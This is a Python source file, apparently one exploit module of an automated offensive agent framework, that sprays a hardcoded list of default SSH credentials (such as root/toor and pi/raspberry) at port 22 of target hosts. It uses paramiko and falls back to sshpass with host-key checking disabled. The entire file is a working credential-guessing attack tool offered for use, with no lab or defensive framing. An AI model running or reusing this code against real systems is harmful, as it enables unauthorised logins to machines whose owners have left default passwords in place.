"""SSH default credential spray."""

from __future__ import annotations

import socket
import subprocess
from typing import Sequence, Tuple

from agent.offensive.modules.base import ExploitModule, ExploitResult
from agent.state import HostHit

DEFAULT_CREDS: Sequence[Tuple[str, str]] = (
    ("root", "root"),
    ("admin", "admin"),
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
    ("root", "toor"),
)


class SshDefaultsModule(ExploitModule):
    name = "ssh_defaults"
    ports = (22,)

    def run(self, host: HostHit) -> ExploitResult:
        if 22 not in host.open_ports:
            return ExploitResult(False)
        for user, password in DEFAULT_CREDS:
            if self._try_ssh(host.ip, user, password):
                return ExploitResult(True, (user, password))
        return ExploitResult(False)

    def _try_ssh(self, ip: str, user: str, password: str) -> bool:
        try:
            with socket.create_connection((ip, 22), timeout=2.0):
                pass
        except OSError:
            return False

        try:
            import paramiko

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                ip,
                username=user,
                password=password,
                timeout=4.0,
                allow_agent=False,
                look_for_keys=False,
                auth_timeout=4.0,
            )
            client.close()
            return True
        except ImportError:
            return self._try_ssh_subprocess(ip, user, password)
        except Exception:
            return False

    def _try_ssh_subprocess(self, ip: str, user: str, password: str) -> bool:
        try:
            result = subprocess.run(
                [
                    "sshpass",
                    "-p",
                    password,
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "-o",
                    "BatchMode=no",
                    f"{user}@{ip}",
                    "exit",
                ],
                capture_output=True,
                timeout=6,
                check=False,
            )
            return result.returncode == 0
        except (OSError, subprocess.SubprocessError):
            return False
